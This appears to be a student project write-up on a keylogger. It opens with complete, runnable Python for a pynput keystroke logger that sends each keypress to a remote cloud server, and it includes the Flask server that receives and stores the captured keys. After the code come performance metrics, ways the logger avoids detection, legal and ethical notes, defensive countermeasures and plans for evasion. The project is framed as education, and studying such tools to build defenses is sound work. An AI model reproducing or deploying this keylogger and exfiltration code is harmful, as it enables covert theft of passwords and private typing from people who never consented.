from pynput import keyboard
import logging
import requests
import json
from datetime import datetime

# Configure logging
logging.basicConfig(
    filename="keylog.txt", 
    level=logging.DEBUG, 
    format="%(asctime)s: %(message)s"
)

class RemoteKeylogger:
    def __init__(self, server_url):
        self.server_url = server_url
        
    def on_press(self, key):
        try:
            key_data = {
                'key': key.char,
                'timestamp': datetime.now().isoformat(),
                'type': 'character'
            }
            logging.info(f"Character key pressed: {key.char}")
        except AttributeError:
            key_data = {
                'key': str(key),
                'timestamp': datetime.now().isoformat(),
                'type': 'special'
            }
            logging.info(f"Special key pressed: {key}")
        
        # Send to remote server
        self.send_to_server(key_data)
    
    def send_to_server(self, data):
        try:
            response = requests.post(
                f"{self.server_url}/keylog", 
                json=data,
                timeout=5
            )
        except requests.exceptions.RequestException as e:
            logging.error(f"Failed to send data to server: {e}")
    
    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# Initialize and start keylogger
if __name__ == "__main__":
    SERVER_URL = "http://[GCP-EXTERNAL-IP]:8080"
    keylogger = RemoteKeylogger(SERVER_URL)
    keylogger.start_logging()
```

from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)

@app.route('/keylog', methods=['POST'])
def receive_keylog():
    data = request.json
    
    # Log received data
    with open('server_keylog.txt', 'a') as f:
        f.write(f"{data['timestamp']}: {data['type']} - {data['key']}\n")
    
    return jsonify({"status": "received"}), 200

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "active", "timestamp": datetime.now().isoformat()})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
```

### Performance Metrics
- **Keystroke Accuracy**: 100% capture rate for tested inputs
- **Network Latency**: <50ms for local-to-cloud transmission
- **Resource Usage**: Minimal CPU and memory footprint
- **Reliability**: Consistent operation during 30-minute test session

## Security Analysis

### Attack Vector Demonstration
This implementation demonstrates several key attack vectors:
- **Keystroke Interception**: Real-time capture of all keyboard inputs
- **Remote Data Exfiltration**: Automated transmission to external server
- **Persistent Monitoring**: Continuous operation until manually terminated
- **Cloud Infrastructure Abuse**: Leveraging legitimate cloud services for malicious purposes

### Detection Challenges
- **Network Traffic**: HTTPS/HTTP requests may blend with normal web traffic
- **Process Visibility**: Python scripts can be easily disguised or renamed
- **Resource Footprint**: Minimal system resource usage makes detection difficult

## Ethical & Legal Considerations

### Legal Framework
- **Unauthorized Use**: Keyloggers are illegal when deployed without explicit consent
- **Privacy Violations**: Capturing personal data violates privacy laws (GDPR, CCPA)
- **Corporate Environments**: May be legally used for employee monitoring with proper disclosure

### Ethical Guidelines Followed
1. **Controlled Environment**: Testing conducted only on owned/authorized systems
2. **Educational Purpose**: Clear academic objective with no malicious intent
3. **Transparent Implementation**: Code is visible and documented for learning
4. **No Personal Data**: No capture of actual sensitive information during testing
5. **Proper Disclosure**: All testing activities documented and supervised

### Responsible Disclosure
This project emphasizes the importance of:
- Understanding threats to build better defenses
- Ethical considerations in cybersecurity research
- Professional responsibility in security tool development

## Prevention Techniques

| Defense Measure | Implementation | Effectiveness |
|----------------|----------------|---------------|
| **Endpoint Security** | Deploy EDR solutions with behavioral analysis | High |
| **Network Monitoring** | Monitor unusual outbound traffic patterns | Medium-High |
| **Application Whitelisting** | Restrict unauthorized executable programs | High |
| **Virtual Keyboards** | Use on-screen keyboards for sensitive input | Medium |
| **Regular Security Audits** | Periodic system scanning and process monitoring | Medium |
| **User Education** | Train users to recognize suspicious activities | Medium |
| **Multi-Factor Authentication** | Reduce impact of compromised credentials | High |

### Technical Countermeasures
```bash
# Example: Detecting suspicious Python processes
ps aux | grep python | grep -v grep

# Monitor network connections
netstat -an | grep :8080

# Check for unusual log files
find /home -name "*.txt" -mtime -1 -exec ls -la {} \;
```

## Limitations

### Technical Limitations
- **Single Platform**: Currently designed for Linux/Ubuntu environments
- **Network Dependency**: Requires active internet connection for remote logging
- **Detection Susceptibility**: Easily identified by modern antivirus solutions
- **No Encryption**: Data transmission occurs in plaintext (enhancement opportunity)
- **Manual Termination**: Requires manual intervention to stop logging

### Scope Limitations
- **Keyboard Only**: Limited to keystroke capture (no screen recording or clipboard)
- **No Persistence**: Does not survive system reboots or automatic startup
- **Single User**: Designed for single-user environments
- **Basic Evasion**: Minimal attempt at hiding or obfuscating activities

## Future Enhancements

Potential improvements for educational purposes:
- **Encryption**: Implement data encryption for transmission and storage
- **Steganography**: Explore data hiding techniques in network traffic
- **Multi-Platform**: Extend support to Windows and macOS environments
- **Advanced Evasion**: Study legitimate techniques used by malware
- **Detection Bypass**: Understand how attackers evade security measures

## Conclusion

This project successfully demonstrated the technical implementation and deployment of a keylogger system using cloud infrastructure. Through hands-on experience with Google Cloud Platform, Remote Desktop Protocol, and Python development, we gained comprehensive understanding of:

1. **Technical Mechanisms**: How keystroke capture and remote transmission function
2. **Infrastructure Management**: Cloud deployment and network configuration
3. **Security Implications**: Both offensive capabilities and defensive requirements
4. **Ethical Responsibilities**: The importance of responsible security research

The combination of local development and cloud deployment provided valuable insights into modern cybersecurity threats while maintaining ethical boundaries. This educational approach reinforces the critical need for robust security measures and responsible disclosure in cybersecurity research.

**Key Takeaway**: Understanding how malicious tools operate is essential for building effective defenses, but such knowledge must always be applied ethically and legally.
